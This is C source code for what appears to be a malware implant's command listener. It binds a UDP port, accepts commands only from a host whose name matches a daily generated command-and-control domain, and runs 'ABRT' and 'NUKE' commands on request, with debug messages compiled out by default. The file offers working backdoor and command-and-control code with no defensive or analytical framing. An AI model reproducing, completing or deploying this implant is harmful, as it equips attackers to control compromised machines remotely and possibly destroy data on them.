#include "implant.h"

static int verify_domain(char * host)
{
  char todays_domain[NI_MAXHOST];

  generate_domain();
  memset(todays_domain, 0, sizeof(todays_domain));
  strcat(todays_domain, g_domain);
  strcat(todays_domain, ".");
  strcat(todays_domain, CNC_TLD);
  return strcmp(host, todays_domain);
}

static void handle_cmd(char *cmd)
{
#ifdef DEBUG
  if (strncmp(cmd, "TEST", CMD_SIZE) == 0)
    return test();
#endif

  if (strncmp(cmd, "ABRT", CMD_SIZE) == 0)
    return abrt();

  if (strncmp(cmd, "NUKE", CMD_SIZE) == 0)
    return nuke();
}

void wait_for_cmd(int const sfd)
{
  struct sockaddr_storage peer_addr;
  socklen_t peer_addr_len;
  char host[NI_MAXHOST], service[NI_MAXSERV];
  ssize_t nread;
  int s;
  char cmd[CMD_SIZE];

  for (;;)
  {
#ifdef DEBUG
    printf("Wait for command...\n");
#endif
    peer_addr_len = sizeof(peer_addr);
    nread = recvfrom(sfd, cmd, CMD_SIZE, 0, (struct sockaddr *) &peer_addr, &peer_addr_len);
    if (nread == -1)
      continue;

#ifdef DEBUG
    printf("Received %zd bytes: %.4s\n", nread, cmd);
#endif
    if (nread != CMD_SIZE)
    {
#ifdef DEBUG
      fprintf(stderr, "not a command\n");
#endif
      continue;
    }

    s = getnameinfo((struct sockaddr *) &peer_addr, peer_addr_len, host, NI_MAXHOST, service, NI_MAXSERV, NI_NUMERICSERV);
    if (s != 0)
    {
#ifdef DEBUG
      fprintf(stderr, "getnameinfo: %s\n", gai_strerror(s));
#endif
      continue;
    }

#ifdef DEBUG
    printf("Received from %s:%s\n", host, service);
#endif
    if (verify_domain(host) != 0)
    {
#ifdef DEBUG
      fprintf(stderr, "not from cnc\n");
#endif
      continue;
    }

    handle_cmd(cmd);

    cmd[0] = 'A'; cmd[1] = 'C'; cmd[2] = 'K'; cmd[3] = 0;
    if (sendto(sfd, cmd, CMD_SIZE, 0, (struct sockaddr *) &peer_addr, peer_addr_len) != nread)
    {
#ifdef DEBUG
      fprintf(stderr, "Error sending response\n");
#endif
    }
  }
}

int main()
{
  struct addrinfo hints;
  struct addrinfo *result = NULL;
  bool bound = false;

  memset(&hints, 0, sizeof(hints));
  hints.ai_family = AF_UNSPEC;    /* Allow IPv4 or IPv6 */
  hints.ai_socktype = SOCK_DGRAM; /* Datagram socket */
  hints.ai_flags = AI_PASSIVE;    /* For wildcard IP address */
  hints.ai_protocol = 0;          /* Any protocol */
  hints.ai_canonname = NULL;
  hints.ai_addr = NULL;
  hints.ai_next = NULL;

  int s = getaddrinfo(NULL, PORT, &hints, &result);
  if (s != 0)
  {
#ifdef DEBUG
    fprintf(stderr, "getaddrinfo: %s\n", gai_strerror(s));
#endif
    exit(EXIT_FAILURE);
  }

  int sfd = -1;
  struct addrinfo *rp = NULL;
  for (rp = result; rp != NULL; rp = rp->ai_next)
  {
    sfd = socket(rp->ai_family, rp->ai_socktype, rp->ai_protocol);
    if (sfd == -1)
      continue;

    if (bind(sfd, rp->ai_addr, rp->ai_addrlen) == 0)
    {
      bound = true;
      break; // success
    }

    close(sfd);
  }

  freeaddrinfo(result);

  if (rp == NULL || !bound)
  {
#ifdef DEBUG
    fprintf(stderr, "Could not bind\n");
#endif
    exit(EXIT_FAILURE);
  }

  wait_for_cmd(sfd);
}
